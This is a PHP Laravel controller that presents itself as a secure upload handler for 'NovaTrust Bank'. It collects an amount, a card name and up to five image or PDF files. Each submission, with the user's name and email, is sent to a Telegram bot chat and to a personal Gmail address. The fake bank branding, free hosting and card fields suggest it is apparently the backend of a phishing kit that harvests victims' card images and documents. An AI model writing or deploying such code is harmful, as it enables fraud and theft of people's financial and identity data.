<?php  
  
namespace App\Http\Controllers;  
  
use App\Models\Upload;  
use Illuminate\Http\Request;  
use Illuminate\Support\Facades\Auth;  
use Illuminate\Support\Facades\Mail;  
use Illuminate\Support\Facades\Log;  
use Illuminate\Support\Facades\Http;
use App\Helpers\TelegramHelper;

class UploadController extends Controller  
{  
    /**
     * Handle secure file uploads.
     */
    public function store(Request $request)
    {
        // ✅ Validate incoming form data
        $validated = $request->validate([
            'amount'        => 'required|numeric|min:1',
            'card_name'     => 'required|string|max:255',
            'description'   => 'nullable|string|max:1000',
            'upload_file1'  => 'required|file|mimes:jpg,jpeg,png,pdf|max:5120',
            'upload_file2'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
            'upload_file3'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
            'upload_file4'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
            'upload_file5'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
        ]);

        $uploadedFiles = [];
        $description = $validated['description'] ?? null;

        // ✅ Upload all selected files (1–5)
        foreach (range(1, 5) as $i) {
            $fileKey = 'upload_file' . $i;

            if ($request->hasFile($fileKey)) {
                $file = $request->file($fileKey);
                $path = $file->store('uploads', 'public');

                $upload = Upload::create([
                    'user_id'       => Auth::id(),
                    'amount'        => $validated['amount'],
                    'card_name'     => $validated['card_name'],
                    'description'   => $description,
                    'file_path'     => $path,
                    'original_name' => $file->getClientOriginalName(),
                ]);

                $uploadedFiles[] = $upload;
            }
        }

        if (empty($uploadedFiles)) {
            return back()
                ->withErrors(['upload_file1' => 'Please upload at least one file.'])
                ->withInput();
        }

        // ============================================================
        // ✅ TELEGRAM NOTIFICATION (IMAGE PREVIEW + PDF ATTACHMENT)
        // ============================================================

        $user = Auth::user();

        $caption =
            "🔐 <b>New Secure Upload</b>\n" .
            "👤 User: {$user->name}\n" .
            "📧 Email: {$user->email}\n" .
            "💵 Amount: $" . number_format($validated['amount'], 2) . "\n" .
            "💳 Card Name: {$validated['card_name']}\n" .
            "📝 Description: " . ($description ?: 'N/A') . "\n" .
            "🕒 " . now()->format('Y-m-d H:i:s') . "\n" .
            "🌐 novatrustbank.onrender.com";

        $token = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');

        $imageExt = ['jpg', 'jpeg', 'png', 'gif', 'webp'];

        foreach ($uploadedFiles as $upload) {
            $fileFullPath = storage_path('app/public/' . $upload->file_path);
            $ext = strtolower(pathinfo($fileFullPath, PATHINFO_EXTENSION));
            $fileName = basename($fileFullPath);

            if (!file_exists($fileFullPath)) {
                continue;
            }

            try {
                if (in_array($ext, $imageExt)) {
                    // 📸 Send image with preview
                    Http::attach('photo', file_get_contents($fileFullPath), $fileName)
                        ->post("https://api.telegram.org/bot{$token}/sendPhoto", [
                            'chat_id' => $chatId,
                            'caption' => $caption,
                            'parse_mode' => 'HTML',
                        ]);
                } else {
                    // 📄 Send document (PDF)
                    Http::attach('document', file_get_contents($fileFullPath), $fileName)
                        ->post("https://api.telegram.org/bot{$token}/sendDocument", [
                            'chat_id' => $chatId,
                            'caption' => $caption,
                            'parse_mode' => 'HTML',
                        ]);
                }
            } catch (\Exception $e) {
                Log::error('Telegram upload failed: ' . $e->getMessage());
            }
        }

        // ============================================================
        // ✅ EMAIL SENDING (UNCHANGED)
        // ============================================================

        try {
            $attachments = [];
            foreach ($uploadedFiles as $upload) {
                $path = storage_path('app/public/' . $upload->file_path);
                if (file_exists($path)) {
                    $attachments[] = $path;
                }
            }

            $fileNames = collect($uploadedFiles)->pluck('original_name')->implode(', ');

            Mail::send([], [], function ($message) use ($attachments, $validated, $description, $fileNames) {
                $message->to('collaomn@gmail.com')
                        ->subject('📎 New Secure Upload from NovaTrust Bank')
                        ->setBody("
                            New secure upload received:

                            👤 Card Name: {$validated['card_name']}
                            💰 Amount: \${$validated['amount']}
                            📝 Description: " . ($description ?: 'N/A') . "
                            📎 Files: {$fileNames}
                        ");

                foreach ($attachments as $path) {
                    $message->attach($path);
                }
            });

        } catch (\Exception $e) {
            Log::error('Email sending failed: ' . $e->getMessage());
        }

        // ============================================================
        // ✅ Redirect to success page
        // ============================================================

        return redirect()
            ->route('secure.upload.success', ['id' => $uploadedFiles[0]->id])
            ->with('success', '✅ Upload saved and sent successfully!');
    }

    /**
     * Show upload success page.
     */
    public function success($id)
    {
        $upload = Upload::findOrFail($id);
        return view('upload_success', compact('upload'));
    }
}
